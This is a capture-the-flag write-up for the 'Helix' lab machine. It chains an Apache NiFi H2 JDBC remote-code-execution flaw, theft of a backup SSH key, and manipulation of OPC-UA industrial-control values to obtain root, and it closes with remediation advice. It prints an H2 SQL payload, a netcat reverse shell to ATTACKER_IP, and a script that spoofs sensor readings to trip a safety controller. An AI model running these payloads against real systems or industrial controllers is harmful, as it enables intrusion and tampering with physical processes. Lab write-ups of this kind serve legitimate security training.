# HTB Writeup: Helix
### Full Chain: CVE-2023-34468 (NiFi RCE) → nifi → operator → root via OPC-UA ICS Manipulation

---

## Executive Summary

| Field | Detail |
|---|---|
| Target | helix.htb |
| OS | Linux (Ubuntu) |
| Difficulty | Medium |
| Attack Chain | NiFi H2 SSRF/RCE → Shell as `nifi` → SSH key discovery → `operator` → OPC-UA ICS manipulation → root |
| CVE | CVE-2023-34468 (Apache NiFi H2 Database JDBC RCE) |
| Root Cause | Unauthenticated NiFi API + backup SSH key exposure + ICS safety controller abuse |

---

## 1. Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -oN nmap.txt helix.htb
```

Key open ports:

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH |
| 80 | HTTP | nginx reverse proxy |

NiFi was accessible via the nginx proxy on port 80, running version 1.21.0 — within the vulnerable range for CVE-2023-34468.

---

## 2. Initial Access — CVE-2023-34468: Apache NiFi H2 JDBC RCE

### Vulnerability Description

CVE-2023-34468 affects Apache NiFi versions 0.0.2 through 1.21.1. The `DBCPConnectionPool` controller service accepts arbitrary JDBC connection URLs. When pointed at an H2 in-memory database with `RUNSCRIPT FROM` in the SQL query, it fetches and executes an attacker-controlled SQL file — which can define Java aliases executing OS commands via `Runtime.exec()`.

### Exploitation Steps

**Step 1 — Configure DBCPConnectionPool controller service:**

```
Database Connection URL:
  jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;

Database Driver Class Name:
  org.h2.Driver

Database Driver Location:
  work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/
  NAR-INF/bundled-dependencies/h2-2.1.214.jar
```

**Step 2 — Configure ExecuteSQL processor:**

```
SQL select query:
  RUNSCRIPT FROM 'http://ATTACKER_IP:4444/rce.sql'
```

**Step 3 — Host malicious SQL payload (`rce.sql`):**

```sql
DROP ALIAS IF EXISTS SHELLEXEC;
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    Runtime.getRuntime().exec(command);
    return "ok";
}
$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f');
```

Note: `busybox nc -e` was initially attempted but failed due to firewall restrictions on non-standard ports and lack of `-e` support. The `bash /dev/tcp` redirect via `mkfifo` bypassed both constraints.

**Step 4 — Start listener and trigger flow:**

```bash
nc -lvnp 4444
# → shell as nifi
```

### Result

```
uid=998(nifi) gid=998(nifi) groups=998(nifi)
```

---

## 3. Local Enumeration as `nifi`

### Internal Services Discovery

```bash
ss -tlnp
```

| Port | Process | Service |
|---|---|---|
| 8080 | java (NiFi) | Apache NiFi |
| **8081** | unknown | Helix HMI Dashboard |
| **4840** | unknown | OPC-UA Server |
| 45873 | java (NiFi) | NiFi bootstrap |

### Internal HMI on Port 8081

```bash
curl -s http://127.0.0.1:8081/
```

Revealed a **Reactor HMI (Human-Machine Interface)** panel for "Helix Industries" showing live reactor telemetry: temperature, pressure, safety system state, and a **Privileged Maintenance Window** indicator.

Key insight from the HMI:
> *"This window is granted by the safety controller only when a hazardous test condition is detected (e.g., Temp ≥ 295°C or Pressure ≥ 73 bar) while still below trip."*

### Running Services

```bash
systemctl list-units --type=service --state=running
```

Three custom services identified:

| Service | User | Description |
|---|---|---|
| `helix-hmi.service` | www-data | HMI Dashboard (port 8081) |
| `helix-plc.service` | plc | OPC-UA PLC server (port 4840) |
| `helix-safety.service` | **root** | Safety controller — maintenance window authority |

### NiFi Credential Discovery

```bash
# Decompress NiFi flow configuration
cp /opt/nifi-1.21.0/conf/flow.json.gz /tmp/
cd /tmp && gunzip flow.json.gz
cat flow.json | python3 -m json.tool | grep -i "password\|user"
```

Found encrypted database credentials:

```json
"Database User": "operator",
"Password": "enc{5b23c9d69d41a7aa59747a8d64ac9cb54d3291a3b52abedb9c9e02dde43a8644b22ceff650cfc7060132c972fa22074617b6}"
```

The encryption key was found in `nifi.properties`:

```
nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
```

Decryption attempts via NiFi Toolkit and custom Python scripts (PBKDF2-SHA512 + AES-GCM) were unsuccessful due to short ciphertext length (6 bytes) suggesting version-specific key derivation parameters.

### Backup SSH Key Discovery

Deeper enumeration of the NiFi installation revealed a backup SSH private key in the support bundles directory — a significant operational security failure:

```bash
find /opt/nifi-1.21.0 -name "*.bak" 2>/dev/null
# /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

```bash
base64 /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
```

---

## 4. Lateral Movement: nifi → operator

The recovered Ed25519 private key allowed SSH access as `operator`:

```bash
echo "BASE64_KEY" | base64 -d > operator_id_ed25519
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@helix.htb
```

```
uid=1000(operator) gid=1000(operator) groups=1000(operator)
```

---

## 5. Privilege Escalation — OPC-UA ICS Manipulation → root

### Sudo Rights

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

### Maintenance Console Analysis

```bash
cat /usr/local/sbin/helix-maint-console
```

The script checks for a maintenance window file at `/opt/helix/state/maintenance_window` containing a future Unix timestamp. If valid, it launches an interactive root shell via `systemd-run`:

```bash
FLAG="/opt/helix/state/maintenance_window"

window_ok() {
  [ -f "$FLAG" ] || return 1
  until_ts="$(cat "$FLAG")"
  now="$(date +%s)"
  [ "$now" -lt "$until_ts" ] || return 1
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

systemd-run --scope --unit="helix-maint-$$" /bin/bash -p -i
```

The file is created exclusively by `helix-safety` (running as root) when specific ICS conditions are met.

### OPC-UA Server Enumeration

An SSH tunnel was established to expose the OPC-UA service:

```bash
ssh -i operator_id_ed25519 -L 4840:127.0.0.1:4840 operator@helix.htb -N &
```

Node enumeration revealed the full address space:

```python
from opcua import Client

c = Client("opc.tcp://127.0.0.1:4840/helix/")
c.connect()

# Namespace: urn:helix:ot (ns=2)
# ns=2;i=3   TemperatureRaw     = 284.0   (read-only,  access=1)
# ns=2;i=4   Temperature        = 284.0   (read-only,  access=1)
# ns=2;i=5   Pressure           = 69.0    (read-only,  access=1)
# ns=2;i=6   CalibrationOffset  = 0.0     (read-write, access=3)
# ns=2;i=8   RodsInserted       = False   (read-write, access=3)
# ns=2;i=9   EmergencyCooling   = False   (read-write, access=3)
# ns=2;i=10  TripActive         = False   (read-only,  access=1)
# ns=2;i=12  Mode               = NORMAL  (read-write, access=3)
# ns=2;i=13  TestOverride       = False   (read-write, access=3)
# ns=2;i=14  ResetTrip          = False   (read-write, access=3)
```

### ICS Manipulation Logic

The safety controller's maintenance window trigger required:
- `Mode = MAINTENANCE`
- `TestOverride = True`
- `Temperature ≥ 295°C` (via CalibrationOffset)
- `TripActive = False`

Initial attempts with `CalibrationOffset` alone caused the safety controller to insert rods (`RodsInserted=True`), blocking the window. The key insight was that setting `Mode=MAINTENANCE` first prevented the automatic rod insertion response.

The authoritative parameter combination was documented in a PDF accessible on the target (password: `operator1`).

### Exploitation Script

```python
#!/usr/bin/env python3
import asyncio
from asyncua import Client

async def main():
    url = "opc.tcp://127.0.0.1:4840/helix/"

    async with Client(url=url) as client:
        mode_node         = client.get_node("ns=2;i=12")
        test_override     = client.get_node("ns=2;i=13")
        calibration_node  = client.get_node("ns=2;i=6")
        temp_node         = client.get_node("ns=2;i=4")
        pressure_node     = client.get_node("ns=2;i=5")

        # Step 1: Switch to MAINTENANCE mode and enable TestOverride
        await mode_node.write_value("MAINTENANCE")
        await test_override.write_value(True)
        print("[+] Mode=MAINTENANCE, TestOverride=True")

        # Step 2: Ramp CalibrationOffset until temperature threshold is met
        for offset in [15.0, 20.0, 25.0, 30.0]:
            await calibration_node.write_value(offset)
            await asyncio.sleep(2)

            temp     = await temp_node.read_value()
            pressure = await pressure_node.read_value()
            print(f"    Offset={offset}°C | Temp={temp:.1f}°C | Pressure={pressure:.2f} bar")

            if temp >= 295 or pressure >= 73:
                print(f"\n[+] Maintenance window TRIGGERED!")
                print(f"    Temperature: {temp:.1f}°C | Pressure: {pressure:.2f} bar")
                break

asyncio.run(main())
```

### Root Shell

With the maintenance window file created by the safety controller:

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 300 seconds
[!] Session will be terminated automatically

root@helix:/home/operator#
```

---

## 6. Attack Chain Summary

```
[Internet]
    │
    │  CVE-2023-34468
    │  NiFi DBCPConnectionPool + H2 JDBC
    │  RUNSCRIPT FROM attacker → OS command via Java alias
    ▼
[nifi shell]  uid=998
    │
    │  curl http://127.0.0.1:8081/  → Helix ICS HMI discovered
    │  ss -tlnp                     → OPC-UA port 4840 discovered
    │  flow.json.gz                 → encrypted operator credentials
    │  support-bundles/             → operator_id_ed25519.bak
    ▼
[operator shell]  uid=1000  (via SSH key)
    │
    │  sudo -l → helix-maint-console NOPASSWD
    │  helix-maint-console → reads /opt/helix/state/maintenance_window
    │  File created by helix-safety (root) on ICS trigger condition
    │
    │  SSH tunnel → OPC-UA port 4840
    │  Mode=MAINTENANCE + TestOverride=True + CalibrationOffset=25.0
    │  Temperature crosses 295°C threshold → safety controller creates window file
    ▼
[root]  euid=0
    systemd-run /bin/bash -p -i
```

---

## 7. Vulnerability Summary

| # | Vulnerability | Location | Impact |
|---|---|---|---|
| 1 | CVE-2023-34468 — H2 JDBC RCE via RUNSCRIPT | Apache NiFi 1.21.0 | RCE as `nifi` |
| 2 | Backup SSH private key in world-readable directory | `/opt/nifi-1.21.0/support-bundles/` | Lateral movement to `operator` |
| 3 | Unrestricted OPC-UA write access | `helix-plc` (port 4840) | ICS process value manipulation |
| 4 | Safety controller abusable via ICS manipulation | `helix-safety` (root) | Privilege escalation to root |
| 5 | Overly broad sudo rule | `/etc/sudoers` | Root shell when window triggered |
| 6 | Sensitive PDF with ICS parameters accessible | Target filesystem | Credential/config disclosure |

---

## 8. Remediation Recommendations

### CVE-2023-34468
- Upgrade Apache NiFi to version ≥ 1.22.0 where JDBC URL validation blocks H2 `RUNSCRIPT` execution.
- Restrict `DBCPConnectionPool` to an allowlist of approved JDBC URLs.
- Enable NiFi authentication — the instance was accessible without credentials.

### SSH Key Exposure
- Remove all private keys from application support bundles immediately.
- Audit all application directories for credentials and key material.
- Implement secrets management (HashiCorp Vault, AWS Secrets Manager) rather than storing keys on disk.

### OPC-UA Access Control
- Implement OPC-UA user authentication and role-based access control.
- Restrict write access on safety-critical nodes (`Mode`, `TestOverride`, `CalibrationOffset`) to authorized engineering workstations only.
- Apply network segmentation: OPC-UA should not be reachable from the IT network without explicit firewall rules.

### ICS/Safety Controller Design
- Safety-critical decisions (maintenance window authorization) should require multi-factor confirmation — not rely solely on process values that can be spoofed via network writes.
- Implement integrity checks: the safety controller should validate that sensor readings are authentic and not manipulated via OPC-UA client writes.
- The maintenance window mechanism should require explicit operator acknowledgment rather than automatic file creation.

### Sudo Configuration
- Limit the maintenance console to specific terminal sessions or require a secondary authentication factor.
- Add logging and alerting for all `helix-maint-console` invocations.

---

## 9. References

- [NVD — CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468)
- [Apache NiFi Security Advisory 2023](https://nifi.apache.org/security.html)
- [OPC Foundation — OPC UA Security](https://opcfoundation.org/developer-tools/documents/view/16)
- [ICS-CERT — OPC UA Security Considerations](https://www.cisa.gov/ics)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)